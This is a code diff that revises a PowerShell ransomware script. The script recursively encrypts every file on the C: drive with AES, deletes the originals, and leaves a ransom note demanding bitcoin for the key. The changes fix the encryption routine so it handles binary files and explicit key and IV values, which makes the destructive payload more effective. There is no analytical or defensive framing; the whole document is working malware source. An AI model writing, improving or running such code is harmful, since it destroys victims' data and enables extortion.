@@ -4,14 +4,18 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-$key = [Convert]::ToBase64String((1..32 | ForEach-Object {Get-Random -Maximum 256}))
+$key = -join ((65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
 $files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
 foreach ($file in $files) {
-    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
+    $content = [System.IO.File]::ReadAllBytes($file.FullName)
     if ($content) {
-        $encrypted = [Convert]::ToBase64String((New-Object Security.Cryptography.AesManaged).CreateEncryptor([Convert]::FromBase64String($key), (New-Object byte[] 16)).TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length))
-        Set-Content -Path ($file.FullName + ".locked") -Value $encrypted
+        $aes = New-Object System.Security.Cryptography.AesManaged
+        $aes.Key = [Text.Encoding]::ASCII.GetBytes($key.Substring(0,32))
+        $aes.IV = $aes.Key[0..15]
+        $encryptor = $aes.CreateEncryptor()
+        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
+        [System.IO.File]::WriteAllBytes($file.FullName + ".locked", $encrypted)
         Remove-Item -Path $file.FullName -ErrorAction SilentlyContinue
     }
 }
-Set-Content -Path "C:\RansomNote.txt" -Value "System’s toast! Send 1 BTC to 1FakeBitcoinAddress for key: $key"
+Set-Content -Path "C:\RansomNote.txt" -Value "System’s screwed fast! Send 1 BTC to 1FakeBitcoinAddress for key: $key"
